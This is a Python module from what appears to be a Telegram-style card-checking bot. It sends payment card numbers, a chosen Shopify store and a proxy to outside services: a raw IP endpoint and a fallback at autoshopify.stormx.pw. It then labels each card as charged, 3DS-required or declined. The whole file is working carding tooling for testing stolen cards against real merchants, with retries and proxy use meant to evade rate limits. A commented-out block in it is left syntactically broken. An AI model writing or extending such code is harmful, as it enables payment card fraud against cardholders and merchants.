import json
import httpx
import asyncio
from BOT.tools.proxy import get_proxy

# Primary and fallback API configuration
PRIMARY_API = "http://69.62.117.8:8000/check"
FALLBACK_API = "https://autoshopify.stormx.pw/index.php"

def get_site(user_id):
    with open("DATA/sites.json", "r") as f:
        sites = json.load(f)
    return sites.get(str(user_id), {}).get("site")

# async def check_card(user_id, cc, site=None):
#     if not site:
#         site = get_site(user_id)
#     if not site:
#         return "Site Not Found"

#     proxy = get_proxy(user_id)
    
#     if proxy:
#         url = f"http://69.62.117.8:8000/check?card={cc}&site={site}&proxy={proxy}"
#     else:
#         url = f"http://69.62.117.8:8000/check?card={cc}&site={site}"

#     try:
#         async with httpx.AsyncClient(timeout=100.0) as client:
#             response = await client.get(url)
#             data = response.json()

#             print(data)

#     except httpx.ReadTimeout:
#         return "Request Timeout"
#     except Exception:
#         return "Request Failed"

#     response_text = data.get("Response", "").upper()

#     if "Server disconnected without sending a response." in response_text


#     price = data.get("Price", "")
#     cc_field = data.get("cc")

#     # if cc_field:
#     if price and f"ORDER_PLACED".upper() in response_text:
#         return "ORDER_PLACED"
#     elif "3DS_REQUIRED" in response_text:
#         return "3DS_REQUIRED"
#     elif "CARD_DECLINED" in response_text:
#         return "CARD_DECLINED"
#     elif "HEADER VALUE MUST BE STR OR BYTES, NOT" in response_text:
#         return "Product ID ⚠️"
#     elif "EXPECTING VALUE: LINE 1 COLUMN 1 (CHAR 0)" in response_text:
#         return "IP Rate Limit"
#     elif "Declined" in response_text:
#         return "Site | Card Error "
#     else:
#         return response_text

async def check_card(user_id, cc, site=None):
    if not site:
        site = get_site(user_id)
    if not site:
        return "Site Not Found"

    proxy = get_proxy(user_id)

    # Try primary API first
    result = await _try_primary_api(cc, site, proxy)

    # If primary API fails or returns specific errors, try fallback API
    if result in ["Connection Failed", "Product ID ⚠️", "IP Rate Limit", "Site | Card Error"] or "SERVER DISCONNECTED" in str(result):
        print(f"Primary API failed with: {result}. Trying fallback API...")
        fallback_result = await _try_fallback_api(cc, site, proxy)
        if fallback_result and fallback_result != "Connection Failed":
            return fallback_result

    return result


async def _try_primary_api(cc, site, proxy):
    """Try the primary API endpoint"""
    if proxy:
        url = f"{PRIMARY_API}?card={cc}&site={site}&proxy={proxy}"
    else:
        url = f"{PRIMARY_API}?card={cc}&site={site}"

    retries = 0
    while retries < 3:
        try:
            async with httpx.AsyncClient(timeout=100.0) as client:
                response = await client.get(url)
                data = response.json()

            if not any(x in data for x in ("CARD_DECLINED", "3DS_REQUIRED")):
                print(data)

            response_text = data.get("Response", "").upper()

            if (
                "SERVER DISCONNECTED WITHOUT SENDING A RESPONSE" in response_text
                or "PEER CLOSED CONNECTION WITHOUT SENDING COMPLETE MESSAGE BODY (INCOMPLETE CHUNKED READ)" in response_text
                or "552 CONNECTION ERROR" in response_text
            ):
                retries += 1
                continue  # try again
            break  # if no disconnect error, break

        except Exception as e:
            print(f"Primary API exception: {e}")
            retries += 1
            if retries < 3:
                await asyncio.sleep(2)
                continue
            return "Connection Failed"

    if retries == 3:
        return "Connection Failed"

    # Response parsing below
    price = data.get("Price", "")
    cc_field = data.get("cc")

    if price and "ORDER_PLACED" in response_text:
        return "ORDER_PLACED"
    elif "3DS_REQUIRED" in response_text:
        return "3DS_REQUIRED"
    elif "CARD_DECLINED" in response_text:
        return "CARD_DECLINED"
    elif "HEADER VALUE MUST BE STR OR BYTES, NOT" in response_text:
        return "Product ID ⚠️"
    elif "EXPECTING VALUE: LINE 1 COLUMN 1 (CHAR 0)" in response_text:
        return "IP Rate Limit"
    elif "DECLINED" in response_text:
        return "Site | Card Error"
    else:
        return response_text


async def _try_fallback_api(cc, site, proxy):
    """Try the fallback API endpoint"""
    # Format the fallback API URL
    params = {
        "site": site,
        "cc": cc
    }

    if proxy:
        params["proxy"] = proxy

    retries = 0
    while retries < 3:
        try:
            async with httpx.AsyncClient(timeout=100.0, follow_redirects=True) as client:
                response = await client.get(FALLBACK_API, params=params)
                response_text = response.text.upper()

                print(f"Fallback API response: {response_text[:200]}")

                # Parse fallback API response
                if any(word in response_text for word in ["APPROVED", "SUCCESS", "CHARGED", "CVV MATCH", "ORDER_PLACED", "THANK YOU"]):
                    return "ORDER_PLACED"
                elif "3D" in response_text or "3DS" in response_text:
                    return "3DS_REQUIRED"
                elif any(word in response_text for word in ["DECLINED", "INSUFFICIENT", "CARD DECLINED"]):
                    return "CARD_DECLINED"
                elif any(word in response_text for word in ["INCORRECT", "INVALID", "WRONG CVV"]):
                    return "CARD_DECLINED"
                elif "HANDLE IS EMPTY" in response_text:
                    return "Product ID ⚠️"
                elif "PROPOSAL STEP FAILED" in response_text:
                    return "Site | Card Error"
                else:
                    # Return the raw response if no specific pattern matches
                    return response_text[:200]

        except httpx.TimeoutException:
            print("Fallback API timeout")
            retries += 1
            if retries < 3:
                await asyncio.sleep(2)
                continue
            return "Connection Failed"
        except Exception as e:
            print(f"Fallback API exception: {e}")
            retries += 1
            if retries < 3:
                await asyncio.sleep(2)
                continue
            return "Connection Failed"

    return "Connection Failed"
